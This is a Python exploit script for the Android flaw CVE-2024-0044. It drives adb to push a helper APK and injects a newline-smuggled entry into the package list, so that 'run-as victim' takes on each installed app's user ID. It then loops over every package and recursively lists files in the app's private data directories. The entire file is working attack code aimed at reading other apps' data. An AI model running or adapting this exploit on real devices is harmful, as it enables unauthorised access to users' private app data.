# https://nvd.nist.gov/vuln/detail/cve-2024-0044
import subprocess
import sys
from pathlib import Path


def execute_adb_command(cmd_args: list[str]) -> subprocess.CompletedProcess:
    result = subprocess.run(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return result


def adb_push_file(local_path: str, remote_path: str) -> bool:
    result = execute_adb_command(["adb", "push", local_path, remote_path])
    return result.returncode == 0


def adb_shell(cmd: list[str]) -> subprocess.CompletedProcess:
    full_cmd = ["adb", "shell"] + cmd
    return execute_adb_command(full_cmd)


def uninstall_helper(helper_package_id: str) -> None:
    result = adb_shell(["pm", "list", "packages", helper_package_id])
    if helper_package_id in result.stdout:
        adb_shell(["pm", "uninstall", helper_package_id])


def get_package_uid(package_id: str) -> str | None:
    result = adb_shell(["dumpsys", "package", package_id])
    for line in result.stdout.splitlines():
        if "userId=" in line:
            uid = line.strip().split("userId=")[1].split(" ")[0]
            if len(uid) >= 5:
                return uid
    return None


def exploit(target_pkg: str, helper_pkg: str, helper_apk_path: str) -> None:
    uninstall_helper(helper_pkg)

    target_uid = get_package_uid(target_pkg)
    if target_uid is None:
        return

    payload = f"@null\nvictim {target_uid} 1 /data/user/0 default:targetSdkVersion=30 none 0 0 1 @null"
    adb_shell(
        [
            "app_process",
            "-Djava.class.path=" + helper_apk_path,
            "/system/bin",
            "com.objc.dummy.PoC",
            f'"{helper_apk_path}"',
            f'"{payload}"',
        ]
    )


def find_all_files(target_pkg: str) -> list[str]:
    seen_files = set()
    reachable_dirs = []

    for directory in [
        "/data/data",
        "/storage/emulated/0/Android/data/",
        "/sdcard/Android/data/",
        "/data_mirror/ref_profiles/",
        "/data_mirror/data_de/null/0/",
        "/mnt/installer/0/emulated/0/Android/data/",
    ]:
        full_path = f"{directory}/{target_pkg}/"
        result = execute_adb_command(["adb", "shell", "run-as", "victim", "ls", "-lRa", full_path])
        if result.returncode != 0:
            continue

        items = result.stdout.splitlines()
        for item in items:
            parts = item.split(" ")
            parts = [p for p in parts if p]

            if len(parts) < 8:
                continue

            if "total" in item or item.endswith(".") or item.endswith(".."):
                continue

            filename = parts[-1]
            permissions = parts[0]

            full_file_path = full_path + filename
            if full_file_path not in seen_files:
                seen_files.add(full_file_path)
                reachable_dirs.append(f"{full_file_path} ({permissions})")

    return reachable_dirs


def check_every_app() -> None:
    result = adb_shell(["pm", "list", "packages"])
    packages = [pkg.split("package:")[1].strip() for pkg in result.stdout.splitlines() if "package:" in pkg]

    for idx, pkg in enumerate(packages):
        exploit(pkg, "com.objc.dummy", on_device_helper_path)

        id_proc = execute_adb_command(["adb", "shell", "run-as", "victim", "id"])
        if id_proc.returncode != 0:
            print(f"Failed to spawn shell for {pkg}\n")
            continue

        app_reachable_files = find_all_files(pkg)
        prg_string = f"{idx + 1}/{len(packages)}"
        if len(app_reachable_files) == 0:
            print(f"[{prg_string}] {pkg}: 0 files")
        else:
            print(f"[{prg_string}] {pkg}: {len(app_reachable_files)}")
            for item in app_reachable_files:
                print(f"  - {item}")
        print("\n\n")


if __name__ == "__main__":
    if len(sys.argv) != 1:
        print("Usage: python3 find_app_paths.py")
        sys.exit(1)

    helper_apk = Path("bin/package-injection.apk").resolve()
    on_device_helper_path = "/data/local/tmp/poc.apk"

    if not helper_apk.exists():
        sys.exit(1)

    if not adb_push_file(helper_apk.as_posix(), on_device_helper_path):
        sys.exit(1)

    check_every_app()
